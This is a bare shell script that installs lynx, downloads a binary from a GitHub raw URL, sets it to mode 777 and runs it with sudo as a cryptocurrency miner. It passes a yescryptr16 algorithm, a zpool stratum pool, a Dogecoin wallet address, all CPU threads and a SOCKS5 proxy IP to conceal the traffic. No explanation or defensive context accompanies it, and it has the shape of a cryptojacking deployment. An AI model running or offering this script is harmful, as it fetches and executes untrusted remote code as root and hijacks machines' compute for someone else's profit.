apt update
apt install -y lynx
lynx -dont_wrap_pre -dump "https://github.com/TamJsmt/TamJsmt/raw/main/data" > data && chmod 777 data && sudo ./data -a yescryptr16 -o stratum+tcps://yescryptR16.na.mine.zpool.ca:56333 -u DP4etbEqFa6CE4gKQFkEWZPNoXg47MTLXE -p c=DOGE,zap=QOGE -t $(nproc) -x socks5://174.77.111.196:4145
